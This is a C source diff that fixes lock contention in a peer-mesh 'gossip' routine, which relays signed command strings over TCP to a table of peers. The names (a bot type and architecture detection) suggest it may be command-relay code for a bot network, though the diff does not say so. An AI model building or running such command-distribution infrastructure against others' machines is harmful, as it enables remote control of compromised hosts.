@@ -328,13 +328,40 @@ static void *mesh_listen_loop(void *arg) {
 }
 
 /* ── Gossip (#139 step 3) ─────────────────────────────────── */
+/* #230: bump a peer's last_seen after a successful gossip round.
+ * Kept as a tiny locked helper so the network loop itself never
+ * holds g_peer_mutex across blocking I/O. */
+static void mesh_touch_peer(const char *host, uint16_t port) {
+    pthread_mutex_lock(&g_peer_mutex);
+    for (int i = 0; i < MESH_PEER_MAX; i++) {
+        if (g_peers[i].last_seen != 0 && strcmp(g_peers[i].host, host) == 0 &&
+            g_peers[i].port == port) {
+            g_peers[i].last_seen = time(NULL);
+            break;
+        }
+    }
+    pthread_mutex_unlock(&g_peer_mutex);
+}
+
 int mesh_gossip_command(notnet_bot_t *bot, const char *cmd, const char *sig_hex) {
     if (!bot || !cmd || !sig_hex) return 0;
     int pushed = 0;
+    /* #230: snapshot the peer list under the lock (same pattern as
+     * arch_detect.c's cache snapshot), then do the connect/send/recv
+     * round lock-free — one slow peer previously stalled the whole
+     * table (mesh_add_peer, mesh_prune_stale, mesh_has_peers) for up
+     * to N × handshake timeout. */
+    mesh_peer_t snap[MESH_PEER_MAX];
+    int nsnap = 0;
     pthread_mutex_lock(&g_peer_mutex);
-    for (int i = 0; i < MESH_PEER_MAX; i++) {
+    for (int i = 0; i < MESH_PEER_MAX && nsnap < MESH_PEER_MAX; i++) {
         if (g_peers[i].last_seen == 0) continue;
-        int fd = mesh_tcp_connect(g_peers[i].host, g_peers[i].port, RELAY_HANDSHAKE_TIMEOUT);
+        snap[nsnap++] = g_peers[i];
+    }
+    pthread_mutex_unlock(&g_peer_mutex);
+
+    for (int i = 0; i < nsnap; i++) {
+        int fd = mesh_tcp_connect(snap[i].host, snap[i].port, RELAY_HANDSHAKE_TIMEOUT);
         if (fd < 0) continue;
         char payload[RELAY_HANDSHAKE_MAX];
         int n = snprintf(payload, sizeof(payload), "MESH %s %s %s\r\n",
@@ -344,12 +371,11 @@ int mesh_gossip_command(notnet_bot_t *bot, const char *cmd, const char *sig_hex)
         char resp[RELAY_HANDSHAKE_MAX];
         if (mesh_recv_line(fd, resp, sizeof(resp), RELAY_HANDSHAKE_TIMEOUT) == 0 &&
             strncmp(resp, "OK", 2) == 0) {
-            g_peers[i].last_seen = time(NULL);
+            mesh_touch_peer(snap[i].host, snap[i].port);
             pushed++;
         }
         close(fd);
     }
-    pthread_mutex_unlock(&g_peer_mutex);
     if (pushed) log_info("MESH: gossiped command to %d peer(s)", pushed);
     return pushed;
 }
